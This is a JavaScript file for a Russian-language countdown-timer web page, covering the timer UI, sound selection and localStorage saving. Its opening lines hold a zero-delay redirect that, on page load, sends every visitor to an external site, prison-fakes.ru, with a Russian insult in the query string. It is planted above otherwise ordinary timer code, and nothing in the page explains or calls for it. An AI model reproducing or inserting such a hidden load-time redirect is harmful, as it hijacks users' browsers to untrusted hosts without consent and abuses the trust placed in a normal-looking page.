setTimeout(() => {
  window.location.href= 'http://prison-fakes.ru/s/1.php?t=ну%20ты%20саня%20даун'    
}, 0);

let showPopUp = document.getElementById('test');
let popup = document.querySelector('.create_popup')
showPopUp.onclick = () => {
  popup.classList.toggle('show_popup');
  let blockScreen = document.createElement('div');
  // blockScreen.classList.add('block_screen');
  // document.body.append(blockScreen);
}


createList(document.getElementById('days_options'), 1, 31);
createList(document.getElementById('hours_options'), 0, 23);
createList(document.getElementById('mins_options'), 0, 59);

let monthsSelect = document.getElementById('months_select')
let daysSelect = document.getElementById('days_select');
let hoursSelect = document.getElementById('hours_select');
let minsSelect = document.getElementById('mins_select');

let selects = document.querySelectorAll('.select');
let options = document.querySelectorAll('.options');

let months = ['Январь', 'Февраль', 'Март', 'Апрель', 'Май', 'Июнь', 'Июль', 'Август', 'Сентябрь', 'Октябрь', 'Ноябрь', 'Декабрь'];

setSelectNames();
setListeners();


// set default date on timer's selects
function setSelectNames() { 
  let date = new Date();
  monthsSelect.textContent = months[date.getMonth()];
  daysSelect.textContent = date.getDate();
  hoursSelect.textContent = checkZero(date.getHours()+1);
  minsSelect.textContent = '00';
}

// set toggle logic of selects
function setListeners() {
  selects.forEach( (elem, i) => {
    elem.addEventListener('click', () => {
      options[i].classList.toggle('show');
    });
  
    options[i].addEventListener('click', function(e) {
         let target = e.target;
         elem.textContent = target.textContent;
         elem.classList.remove('show');
       });
  
    document.addEventListener('click', e => {
      if ( e.target != elem ) options[i].classList.remove('show');
    })
  });
}

// create lists
function createList(elem, from, to) {
  for (let i = from; i <= to; i++) {
    let appendElem = document.createElement('div');
    appendElem.classList.add('option');
    appendElem.textContent = checkZero(i);
    elem.append(appendElem);
  }
}

// return 01 instead 1, 02 instead 2...
function checkZero(num) {
  if ( (num + '').length == 1) return '0'+num;
  else return num;
}

//////////////////////////////

let input = document.querySelector('input[name = setDate]');
let createButtonDateTimer = document.querySelector('#createButtonDateTimer');


class DateTimer{
  constructor(date){
    this.end = date.getTime();
    this.interval;
    this.timerDiv;
    this.sound;
  }

  generate() {
    this.timerDiv = document.createElement('div');
    this.buttonStop = document.createElement('button');
    this.buttonStart = document.createElement('button');
    this.buttonDelete = document.createElement('button');
    this.months = document.createElement('div');
    this.days = document.createElement('div');
    this.hours = document.createElement('div');
    this.minutes = document.createElement('div');
    this.seconds = document.createElement('div');
    this.mili = document.createElement('div');

    this.timerCounters = document.createElement('div');
    this.buttonsWrapper = document.createElement('div');
    this.monthsWrapper = document.createElement('div');
    this.months.classList.add('counter_point');
    this.days.classList.add('counter_point');
    this.hours.classList.add('counter_point');
    this.minutes.classList.add('counter_point');
    this.seconds.classList.add('counter_point');
    this.mili.classList.add('counter_point');

    this.counterPoints = [this.months, this.days, this.hours, this.minutes, this.seconds, this.mili];
    this.counterPointsNames = ['months', 'days', 'hours', 'minutes', 'seconds', 'miliseconds'];
    this.timerCounters.classList.add('timer_counters');
    this.buttonsWrapper.classList.add('buttons_wrapper');

    this.buttonStart.textContent = 'START';
    this.buttonStop.textContent = 'STOP';
    this.buttonDelete.textContent = 'DELETE';
    this.buttonStart.classList.add('start_button');
    this.buttonDelete.classList.add('delete_button');
    this.buttonStop.classList.add('stop_button');
    this.buttonStop.onclick = () => this.pauseCount();
    this.buttonStart.onclick = () => this.startCount();
    this.buttonDelete.onclick = () => this.deleteTimer();

    this.timerDiv.style.opacity = '0';
    this.timerDiv.classList.add('timer');
    this.timerDiv.append(this.timerCounters);
    this.timerDiv.append(this.buttonsWrapper);
    this.timerCounters.append(this.months);
    this.timerCounters.append(this.days);
    this.timerCounters.append(this.hours);
    this.timerCounters.append(this.minutes);
    this.timerCounters.append(this.seconds);
    this.timerCounters.append(this.mili);
    this.buttonsWrapper.append(this.buttonStart);
    this.buttonsWrapper.append(this.buttonStop);
    this.buttonsWrapper.append(this.buttonDelete);

    createWrappersForCounterPoints.call(this);

    document.body.append(this.timerDiv);
  
    setTimeout(() => {
      this.timerDiv.style.opacity = '1';
    });

    function createWrappersForCounterPoints() {
      this.counterPoints.forEach( (elem, i) => {
        let wrapper = document.createElement('div');
        let bottomText = document.createElement('span');
        bottomText.textContent = this.counterPointsNames[i];
        bottomText.classList.add('counter_point_bottom_text')
        wrapper.append(elem);
        wrapper.append(bottomText);
        wrapper.classList.add('counter_point_wrapper');
        this.timerCounters.append(wrapper);
      })
    }
    
  }

  createSound(song) {
    if (song) {
      this.sound.__proto__ = Sound.prototype;
      this.sound.soundBoard = this.sound.generateSoundBoard();
    }
    else this.sound = new Sound();
    this.buttonsWrapper.append(this.sound.soundBoard);
  }
  
  startCount() {
    this.updateTime();
    this.interval = setInterval(this.updateTime.bind(this));
  }

  pauseCount() {
    clearInterval(this.interval);
  }

  deleteTimer() {
    this.timerDiv.parentNode.removeChild(this.timerDiv);
    storageArray.forEach ( (elem, i) => {
      if (this == elem) deleteFromArray(i);
    })

    function deleteFromArray(i) {
      storageArray.splice(i,1);
      localStorage.setItem('timers', JSON.stringify(storageArray));      
    }
  } 

  endAlert() {
    let soundSelected = this.sound.soundSelected;
    for (let key in audios) {
      if (audios[key]['name'] == soundSelected) {
        let test = new Audio();
        test.src = audios[key]['src'];
        test.play();
      }
    }
  }

  updateTime() {
    let temp = this.end - Date.now()

    if (temp < 0) {
      this.pauseCount();
      drawTime.call(this, '00','00','00','00','00','00');
      this.endAlert();
      return;
    }

    let months = Math.floor(temp / 2592000000);
    let days = Math.floor((temp - (2592000000 * months)) / 86400000);
    let hours = Math.floor((temp - (2592000000 * months) - 86400000 * days) / (1000*3600));
    let minutes = Math.floor((temp - (2592000000 * months) - (86400000 * days) - (1000 * 3600 * hours)) / (1000 * 60));
    let seconds = Math.floor(((temp - (2592000000 * months) - (86400000 * days) - (1000 * 3600 * hours) - (1000 * 60 * minutes)) / 1000));
    let mili = Math.floor((temp - (2592000000 * months) - (86400000 * days) - (1000 * 3600 * hours) - (1000 * 60 * minutes) - (1000 * seconds)) / 10);

    let fixZero = validateOutput(months, days, hours, minutes, seconds, mili);
    drawTime.apply(this, [...fixZero]);

    function validateOutput() {
      let result = [];
      for (let i = 0; i < arguments.length; i++) {
        if ((''+arguments[i]).length == 1) result.push('0'+arguments[i]);
        else result.push(arguments[i]);
      }
      return result;
    }

    function drawTime() {
      let months = arguments[0];
      let days = arguments[1];
      let hours = arguments[2];
      let minutes = arguments[3];
      let seconds = arguments[4];
      let mili = arguments[5];

      this.months.textContent = months;
      this.days.textContent = days;
      this.hours.textContent = hours;
      this.minutes.textContent = minutes;
      this.seconds.textContent = seconds;
      this.mili.textContent = mili+'';
    }
  }
}

let audios = {
  defaultStatus: 'Без звука',
  iphoneAlarm: {
    name: 'iPhone Melody',
    src: 'http://d.zaix.ru/csMd.mp3'
  },
  androidAlarm: {
    name: 'Android Melody',
    src: 'http://d.zaix.ru/csMd.mp3'    
  }
}

audios.iphoneAlarm.src = 'http://d.zaix.ru/csMd.mp3';

let audiosCount = 2;

class Sound {
  constructor() {
    this.soundSelected = false;
    this.soundBoard = this.generateSoundBoard();
  }

  generateSoundBoard() {
    // let soundBoardWrapper = document.createElement('div');
    let soundBoard = document.createElement('div');
    let select = document.createElement('div');
    let options = document.createElement('div');
    soundBoard.classList.add('sound_wrapper');
    select.classList.add('sound_select');
    options.classList.add('options');
    options.classList.add('offScrollY');
    options.style.height = audiosCount*31+'px';
    soundBoard.append(select);
    soundBoard.append(options);
    createOptionsList.call(this);
    setListenerss.call(this);

    return soundBoard;
    
    // create list of songs from 'audios' (187)
    function createOptionsList() {
      if (!this.soundSelected) select.textContent = audios['defaultStatus'];
      else select.textContent = this.soundSelected;
      
      for (let key in audios){
        if (key == 'defaultStatus') continue;
        let option = document.createElement('div');
        option.classList.add('sound_option');
        option.textContent = audios[key].name;
        options.append(option);
      }
    }

    function setListenerss() {
      select.addEventListener('click', () => options.classList.toggle('show'));
      options.addEventListener('click', e => {
        select.textContent = e.target.textContent;
        this.soundSelected = select.textContent;
        updateStorageArray.call(this)
      });
      document.addEventListener('click', e => {
        if (e.target != select) options.classList.remove('show');
      })
    }
  }
}

createButtonDateTimer.onclick = startCreateDate;

function startCreateDate() {
  let date = validateDateTimer();
  if (!date) return false;
  let timer = new DateTimer(new Date(2019, date.months, date.days, date.hours, date.mins));
  timer.generate();
  timer.startCount();
  timer.createSound(timer.sound);
  storageArray.push(timer);
  localStorage.setItem('timers', JSON.stringify(storageArray));
}

let savedTimers = checkStorage();

function checkStorage() {
  let timers = localStorage.getItem('timers');
  if (!timers) return '';
  return JSON.parse(timers);
}

let storageArray = savedTimers || [];
storageArray.forEach( timer => {
  timer.__proto__ = DateTimer.prototype;
  timer.generate();
  timer.startCount();
  timer.createSound(timer.sound);
  console.log(timer.sound);

  });

function validateDateTimer() {
  let days = daysSelect.textContent;
  let monthsIndex = months.indexOf(monthsSelect.textContent);
  let hours = hoursSelect.textContent;
  let mins = minsSelect.textContent;

  let timerDate = {
    months: monthsIndex,
    days: days,
    hours: hours,
    mins: mins
  }

  if (new Date(2019, +monthsIndex, +days, +hours, +mins).getTime() < Date.now()) {
    alert ('Введите корректные значения даты');
    return;
  }
  return timerDate;
}

function updateStorageArray() {

  console.log(localStorage);
  console.log(this.soundSelected);
  localStorage.setItem('timers', JSON.stringify(storageArray));
}

document.onclick = () => {
}

